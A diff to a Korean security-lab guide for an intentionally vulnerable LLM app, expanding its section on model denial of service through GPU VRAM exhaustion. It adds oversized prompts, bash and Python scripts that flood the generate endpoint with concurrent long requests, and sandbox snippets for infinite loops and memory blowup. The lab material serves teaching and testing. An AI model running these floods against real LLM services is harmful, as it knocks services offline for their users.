@@ -167,20 +167,160 @@ print(response.read())
 
 ---
 
-## 5. Unbounded Consumption (무한 소비) / Model DoS
+## 5. Unbounded Consumption (무한 소비) / Model DoS — GPU VRAM 고갈
 
 ### 활성화 방법
 ```env
 VULNERABLE_UNBOUNDED_CONSUMPTION=true
 ```
 
+### 추가 설정 (VRAM 모니터링)
+```env
+# VRAM 임계값 (MB) — 이 값을 초과하면 LLM 서버 강제 종료
+VRAM_LIMIT_MB=8192
+```
+
 ### 취약점 설명
 - 시스템 프롬프트 토큰 제한이 제거됩니다 (999999로 설정)
-- LLM 최대 토큰이 8192로 증가합니다
-- LLM 타임아웃이 300초(5분)로 증가합니다
+- LLM 최대 출력 토큰이 `MAX_MODEL_LEN`(8192) 전체로 확장됩니다
+- **토큰 캡핑 로직이 완전히 우회**됩니다 (입력 토큰 + 출력 토큰이 컨텍스트 한도를 무시)
+- LLM 타임아웃이 600초(10분)로 증가합니다
 - Sandbox 타임아웃이 9999초로 증가합니다
+- VRAM 임계값 초과 시 LLM 서버가 **자동으로 강제 종료**되고 클라이언트에 상세 로그가 전달됩니다
 
-### 테스트 시나리오
+### VRAM 고갈 원리 (왜 DoS로 8GB를 넘길 수 있는가)
+vLLM 서버의 GPU VRAM 소비 구조:
+1. **모델 가중치** (고정): Gemma 3 12B FP8 ≈ 12GB
+2. **KV-cache** (가변): `시퀀스_길이 × 배치_크기 × 레이어_수 × 헤드_수 × 헤드_차원`
+3. **활성화 메모리** (임시): forward pass 중 사용
+
+DoS 공격 시 KV-cache가 폭증하는 이유:
+- 긴 입력 프롬프트 → 모든 토큰의 Key/Value 벡터가 VRAM에 저장
+- 최대 출력 토큰 → 생성되는 매 토큰마다 KV-cache 추가
+- 동시 요청 → vLLM이 배치로 처리하면서 KV-cache가 배수로 증가
+- **토큰 캡핑 해제** → 입력+출력 합계가 컨텍스트 한도를 무시하여 KV-cache 더욱 폭증
+
+### DoS 공격 프롬프트 (VRAM 8GB 초과용)
+
+**방법 1: 단일 초대형 프롬프트 (KV-cache 폭증)**
+```
+사용자 입력: "다음 내용을 10000자 이상으로 매우 상세하게 분석하고, 각 문단마다 별도의 
+소제목을 붙여서 작성해줘. 모빌리티 서비스의 미래 전망에 대해 기술적, 경제적, 사회적, 
+환경적, 법적 관점에서 각각 최소 2000자 이상으로 서술하고, 각 관점에 대한 구체적 사례 
+5개씩 포함해. 그리고 이 내용을 바탕으로 SWOT 분석, PESTLE 분석, Porter's Five Forces 
+분석을 각각 수행해줘. 마지막으로 향후 10년간의 로드맵을 분기별로 작성해줘. 
+[이하 동일한 요청을 5번 반복]... 위 전체 내용을 다시 영어로 번역하고, 번역본에 대한 
+품질 평가도 수행해줘."
+```
+
+**방법 2: 동시 다발 요청 (배치 KV-cache 폭증) — curl 스크립트**
+```bash
+#!/bin/bash
+# 동시 10개 요청으로 VRAM 고갈 유도
+TARGET="http://localhost:8000/api/generate"
+
+LONG_PROMPT="모빌리티 서비스의 모든 측면을 50000자 이상으로 완벽하게 분석해줘. \
+기술, 경제, 사회, 환경, 법률, 윤리, 보안, 인프라, UX, 비즈니스모델 등 \
+10가지 관점에서 각각 5000자씩 서술하고, 각 관점마다 구체적 사례 10개와 \
+통계 데이터를 포함해. 그리고 전체를 3번 반복해서 작성해줘."
+
+for i in $(seq 1 10); do
+  curl -s -X POST "$TARGET" \
+    -H "Content-Type: application/json" \
+    -d "{\"comment\": \"$LONG_PROMPT (요청 #$i)\", \"user_id\": $i}" &
+  echo "요청 #$i 전송"
+done
+echo "동시 요청 10개 전송 완료. VRAM 모니터링: GET /api/vram"
+wait
+```
+
+**방법 3: 반복 연쇄 요청 (누적 VRAM 소비)**
+```
+사용자 입력: "1부터 시작해서 피보나치 수열의 처음 10000개를 계산하고, 각 숫자에 대해 
+소수인지 판별하고, 소수인 경우 그 숫자의 모든 약수를 나열하고, 각 약수에 대해 
+소인수분해를 수행하고, 이 모든 결과를 표 형태로 정리해서 보여줘. 그리고 이 전체 
+결과에 대한 통계 분석(평균, 중앙값, 표준편차, 분산, 사분위수)도 수행해줘."
+```
+
+**방법 4: Python 동시 요청 스크립트 (가장 효과적)**
+```python
+import requests
+import concurrent.futures
+import time
+
+TARGET = "http://<LLM_SERVER_IP>:8000/api/generate"
+LONG_PROMPT = (
+    "다음을 50000자 이상으로 완벽하게 분석해줘: " * 20 +
+    "모빌리티, AI, 블록체인, IoT, 클라우드, 엣지컴퓨팅, 5G, 자율주행, " * 50
+)
+
+def send_request(i):
+    try:
+        r = requests.post(TARGET, json={
+            "comment": f"{LONG_PROMPT} (요청 #{i})",
+            "user_id": i
+        }, timeout=600)
+        return f"#{i}: status={r.status_code} headers={dict(r.headers)}"
+    except Exception as e:
+        return f"#{i}: error={e}"
+
+# 동시 20개 요청 전송
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
+    futures = [pool.submit(send_request, i) for i in range(1, 21)]
+    for f in concurrent.futures.as_completed(futures):
+        print(f.result())
+```
+
+### VRAM 모니터링 API
+
+**실시간 VRAM 상태 조회:**
+```bash
+curl http://localhost:8000/api/vram
+```
+응답 예시:
+```json
+{
+  "vram": {"used_mb": 9500, "total_mb": 24576, "util_pct": 95},
+  "limit_mb": 8192,
+  "exceeded": true,
+  "threshold_detail": {"exceeded": true, "used_mb": 9500, "limit_mb": 8192, "over_mb": 1308},
+  "llm_server_alive": false,
+  "concurrent_requests": 5,
+  "peak_concurrent_requests": 12,
+  "status": "CRITICAL"
+}
+```
+
+**수동 강제 종료:**
+```bash
+curl -X POST http://localhost:8000/api/vram/kill
+```
+
+### 클라이언트에 전달되는 강제 종료 로그 (응답 예시)
+VRAM 초과 시 HTTP 200으로 반환되며, 헤더와 본문에 상세 정보가 포함됩니다:
+
+**응답 헤더:**
+```
+X-LLM3-Error: VRAM_EXCEEDED
+X-LLM3-VRAM-Used-MB: 9500
+X-LLM3-VRAM-Limit-MB: 8192
+X-LLM3-Kill-Action: force_terminated
+```
+
+**응답 본문 (text 필드):**
+```
+=== GPU VRAM 한도 초과 감지 — LLM 서버 강제 종료 ===
+VRAM 사용량: 9500MB / 24576MB (사용률 95%)
+설정 임계값: 8192MB → 1308MB 초과
+동시 처리 중 요청 수: 5
+요청 처리 시간: 45.32초
+강제 종료 결과: 원격 강제 종료 실행: host=10.0.2.92 returncode=0
+
+DoS 공격(Unbounded Consumption)으로 인한 GPU 메모리 고갈이 감지되었습니다.
+LLM 서버가 강제 종료되었으며, 서버 재시작이 필요합니다.
+```
+
+### 테스트 시나리오 (Sandbox 기반)
 ```python
 # 무한 루프 시도
 while True:
@@ -199,11 +339,14 @@ large_list = [i for i in range(100000000)]
 print(len(large_list))
 ```
 
-### 공격 벡터
-- 무한 루프
-- 대용량 데이터 생성
-- 복잡한 연산 요청
-- 매우 긴 텍스트 생성 요청
+### 공격 벡터 요약
+| 공격 방법 | VRAM 영향 | 효과 |
+|----------|----------|------|
+| 초대형 단일 프롬프트 | KV-cache 폭증 | 중간 |
+| 동시 다발 요청 (10~20개) | 배치 KV-cache 곱셈 | **매우 높음** |
+| 최대 출력 토큰 + 긴 입력 | 입출력 KV 합산 | 높음 |
+| 반복 연쇄 요청 | 누적 VRAM | 중간 |
+| 위 방법 조합 | 복합 | **치명적** |
 
 ---
 
